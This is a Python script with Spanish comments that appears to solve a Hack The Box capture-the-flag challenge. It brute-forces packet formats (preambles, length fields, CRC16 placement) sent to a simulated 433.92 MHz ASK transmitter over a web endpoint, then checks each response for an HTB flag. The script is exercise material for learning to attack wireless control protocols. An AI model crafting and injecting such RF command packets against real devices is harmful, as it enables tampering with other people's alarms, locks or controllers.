#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 13: Paquetes con preámbulo
print("[*] INNOVACIÓN 13: Añadir preámbulo AA o 55")
s = requests.Session()
s.get(base_url)

for preamble in ['AA', '55', 'AAAA', '5555']:
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = preamble + (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag con preámbulo")

# INNOVACIÓN 14: Paquetes más largos con más campos
print("\n[*] INNOVACIÓN 14: Formato [LEN][ADDR][CMD][CRC]")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    length = 0x02  # 2 bytes de payload
    data = bytes([length, addr, cmd])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag con LEN")

# INNOVACIÓN 15: CRC al principio en lugar del final
print("\n[*] INNOVACIÓN 15: [CRC][ADDR][CMD]")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16(data)
    packet = (struct.pack('<H', crc) + data).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag con CRC al principio")

# INNOVACIÓN 16: Sin CRC, solo datos raw
print("\n[*] INNOVACIÓN 16: Sin CRC, solo ADDR+CMD")
s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
    packet = bytes([addr, cmd]).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag sin CRC")
